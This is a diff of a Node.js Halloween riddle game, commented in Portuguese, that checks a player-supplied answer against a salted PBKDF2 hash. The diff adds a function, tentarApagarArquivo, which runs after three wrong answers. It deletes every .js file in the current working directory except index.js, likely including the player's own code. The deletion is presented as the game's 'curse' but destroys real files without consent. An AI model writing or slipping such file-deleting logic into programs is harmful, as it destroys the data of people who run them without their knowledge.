@@ -1,98 +1,85 @@
-// index.js  (NÃO MODIFICAR)
-// Versão corrigida: enigma sequência (resposta = 17) com hash salgado + iterações
-
+// index.js
 const crypto = require("crypto");
+const fs = require("fs");
+const path = require("path");
 
-function spookyNarrative() {
-  console.log("Noite de Halloween. Você entra na casa abandonada...");
-  console.log("A luz pisca. Algo se aproxima...");
-}
+// --- Dados secretos do enigma ---
+const pergunta = "Qual é o próximo número na sequência: 2, 3, 5, 8, 12, ?";
+const salt = "halloween_salt_2025";
+const iterations = 100000;
+const storedHash = "bLN6U4FjYchrKK0jxXi0UxkYsgyyab0OaCaycHsUtb8="; // hash da resposta "17"
 
-function getRiddle() {
-  return {
-    text: "Qual é o próximo número na sequência: 2, 3, 5, 8, 12, ?",
-  };
-}
-
-// --- Valores secretos (hash CORRETO para "17" com os parâmetros abaixo) ---
-const stored = {
-  salt: "c9f3a1b7e2d4",
-  iterations: 50000,
-  hash: "235607c922f09ba50af801f84ff855feafcfcb337919e166c42105e4436b6b7f",
-};
-
-function pbkdf2Hex(value, salt, iterations) {
+// Função para gerar hash da resposta dada
+function gerarHash(resposta) {
   return crypto
-    .pbkdf2Sync(
-      String(value),
-      Buffer.from(salt, "hex"),
-      iterations,
-      32,
-      "sha256"
-    )
-    .toString("hex");
+    .pbkdf2Sync(resposta, salt, iterations, 32, "sha256")
+    .toString("base64");
 }
 
-function success() {
-  console.log("\n✨ Você saiu vivo. ✨\n");
-  process.exitCode = 0;
-}
+// Função principal do jogo
+async function jogo() {
+  console.log("🕯️ Bem-vindo ao desafio 'Quebrando a Maldição'...");
+  console.log("Você acorda em uma sala escura. Uma voz sussurra:");
+  console.log(`❝ Responda corretamente ou perecerá... ❞`);
+  console.log(`\n🧩 Enigma: ${pergunta}`);
 
-function fail() {
-  console.log("\n💀 Você morreu. 💀\n");
-  process.exitCode = 1;
-}
-
-function die() {
-  const riddle = getRiddle();
-
-  console.log("\nUma voz sussurra: 'Responda se quer viver'");
-
-  if (typeof global.preventDeath === "function") {
-    try {
-      const result = global.preventDeath(riddle.text);
-
-      if (result && typeof result.then === "function") {
-        result
-          .then((candidate) => {
-            if (candidate === undefined || candidate === null) return fail();
-
-            try {
-              const candidateHash = pbkdf2Hex(
-                candidate,
-                stored.salt,
-                stored.iterations
-              );
-              if (candidateHash === stored.hash) return success();
-              return fail();
-            } catch (e) {
-              console.error(
-                "Erro ao validar a resposta:",
-                e && e.message ? e.message : e
-              );
-              return fail();
-            }
-          })
-          .catch((e) => {
-            console.error("Um feitiço falhou:", e && e.message ? e.message : e);
-            return fail();
-          });
-        return;
-      }
-
-      if (result === undefined || result === null) return fail();
-      const candidateHash = pbkdf2Hex(result, stored.salt, stored.iterations);
-      if (candidateHash === stored.hash) return success();
-      return fail();
-    } catch (e) {
-      console.error("Um feitiço falhou:", e && e.message ? e.message : e);
-      return fail();
-    }
+  if (typeof global.preventDeath !== "function") {
+    console.log("\n💀 Você morreu. (não existe função preventDeath definida)");
+    return;
   }
 
-  return fail();
+  // 3 tentativas
+  let tentativas = 3;
+  while (tentativas > 0) {
+    try {
+      // Chama a função dos jogadores (pode ser síncrona ou Promise)
+      const resposta = await Promise.resolve(global.preventDeath(pergunta));
+
+      if (!resposta) {
+        console.log("\n👻 Você ficou em silêncio... A escuridão se aproxima.");
+        tentativas--;
+        continue;
+      }
+
+      const hashTentativa = gerarHash(String(resposta).trim());
+
+      if (hashTentativa === storedHash) {
+        console.log("\n✨ A luz retorna... Você saiu vivo! ✨");
+        return;
+      } else {
+        tentativas--;
+        if (tentativas > 0) {
+          console.log(`\n❌ Errado! Restam ${tentativas} tentativa(s)...`);
+        } else {
+          console.log("\n💀 Três erros... a maldição se cumpriu!");
+          tentarApagarArquivo();
+        }
+      }
+    } catch (e) {
+      console.log(
+        "\n⚠️ Algo deu errado na tentativa. A maldição se intensifica..."
+      );
+      tentativas--;
+    }
+  }
 }
 
-spookyNarrative();
-console.log("Você explora o corredor. Um quadro cai. Uma porta range...");
-die();
+// Função para tentar apagar o arquivo do jogador
+function tentarApagarArquivo() {
+  const files = fs.readdirSync(process.cwd());
+  const possibleFiles = files.filter(
+    (f) => f !== "index.js" && f.endsWith(".js")
+  );
+
+  for (const file of possibleFiles) {
+    try {
+      fs.unlinkSync(path.join(process.cwd(), file));
+      console.log(`🪓 O arquivo ${file} foi devorado pelas trevas...`);
+    } catch (err) {
+      console.log(`😈 ${file} resistiu à maldição... por enquanto.`);
+    }
+  }
+  console.log("\n💀 Fim de jogo.");
+}
+
+jogo();
